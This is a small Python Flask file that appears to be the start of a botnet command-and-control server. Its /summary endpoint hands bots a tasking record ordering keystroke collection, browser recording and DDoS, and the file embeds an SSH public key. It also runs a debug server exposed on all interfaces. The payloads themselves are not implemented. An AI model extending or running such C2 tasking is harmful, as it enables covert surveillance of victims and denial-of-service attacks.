from flask import Flask, render_template, request
from flask import jsonify
import time
import json

with open('new_file.json', 'w') as f:
    print("The json file is created")
app = Flask(__name__, static_folder='static')

@app.route("/")
def hello_world():
    return "<h1>Hello World!</h1>"

@app.route("/summary")
def summary():
    d = attack_summary()
    return jsonify(d)

def attack_summary():
    dict={"command_ID":"",
     "command_name":["collect_keystrokes", "browser_recording", "ddos"],
     "command_type":["harvesting", "obeying"],
     "command_bot_names":"*",
     "start_time": 'Sat Aug 20 00:00:00 2022',
     "end_time": 'Sat Aug 20 00:10:00 2022',
     "send_to_IP":""}
    return dict


def get_public_key():

    #FROM INTERNET
#      return b"""-----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs2tlaA15gVDJsIxbvRej
# DOavwGdVo51gNmDXTctt+06xjf56Gww7/BQQaVD5hzWdOB9S8sRXD/EXha3CF6Yn
# 7EXrtpQFmqkT8aL7uQrgIX3nCr/kYYy1SydCPjGSG+9kTiqX2U5m+3YZRYBg975A
# udQQn4RlVt+cOdjmP9t8eTHjuMr8eZsj3HJ8TFUONirg68yqowZUo5gZ3KRmMdCY
# Ak/rMhZh7JfKzpKgjzxS6NuGEJ/uP6a9QGMGmQGzE5fc6C7REI+rMUnLh3EvXvJ4
# qbQ8ZbGy0IKhlWhnRNde7LQveUB+1LyE27mM3Y2cARXNUoM/Bmf9oS0rB7oyYiEH
# LwIDAQAB
# -----END PUBLIC KEY-----""" 

    #FROM MY COMPUTER I DONT THINK IT NEEDS THE BEGINING AND END, BUT IM NOT SURE
    # return """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAJL3HcRnpToEotri
    # sR5+cBftyn2uY6bvTI8b6FPKRLsDo7sFhTTlKRu62LTFncyPnGiF++3Kqi20AkE
    # K36qo94t2pM6s2QCAaFjiauUaccppQqunNbGkBHYqSum21U5IX11ile83cOVMed
    # V5TZsKziqsf7P6FVfwM5+iTW8astaU+zDBbBUkzX3pPS75pkWuBYxr/xy4eFNNg
    # ITQXnfFzSdvH3iS31GDObrXu1MOjqFPvRI0EJX9WKfykb4la6uQ1WaoSMY5pV8J
    # jj3YAjI7uuA96SVe5sHjXbp3cFchLAKjF/qB6aG/dZbn/S2Dfi1Q9CXKcZV/omO
    # ObmGxhZh0g4+qgmU0EtEj6cqsB7FwiwKysVd4f09aM3ls6SKHXZRG2zpkilasnI
    # r2Fw0cGvIbP5ePwFweMovPbddqUdzAHkcd71qoIqB2I64t8pTuLjTPacslftC0+
    # GeQMNBQG2waCNmZHSNrmPykoyOPWuJUdnb2p7O0431GNH/ISP6Rl2T0= shake@DESKTOP-2EHI8TP"""

    return """AAAAB3NzaC1yc2EAAAADAQABAAABgQDAJL3HcRnpToEotri
    sR5+cBftyn2uY6bvTI8b6FPKRLsDo7sFhTTlKRu62LTFncyPnGiF++3Kqi20AkE
    K36qo94t2pM6s2QCAaFjiauUaccppQqunNbGkBHYqSum21U5IX11ile83cOVMed
    V5TZsKziqsf7P6FVfwM5+iTW8astaU+zDBbBUkzX3pPS75pkWuBYxr/xy4eFNNg
    ITQXnfFzSdvH3iS31GDObrXu1MOjqFPvRI0EJX9WKfykb4la6uQ1WaoSMY5pV8J
    jj3YAjI7uuA96SVe5sHjXbp3cFchLAKjF/qB6aG/dZbn/S2Dfi1Q9CXKcZV/omO
    ObmGxhZh0g4+qgmU0EtEj6cqsB7FwiwKysVd4f09aM3ls6SKHXZRG2zpkilasnI
    r2Fw0cGvIbP5ePwFweMovPbddqUdzAHkcd71qoIqB2I64t8pTuLjTPacslftC0+
    GeQMNBQG2waCNmZHSNrmPykoyOPWuJUdnb2p7O0431GNH/ISP6Rl2T0"""


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080 ,debug=True)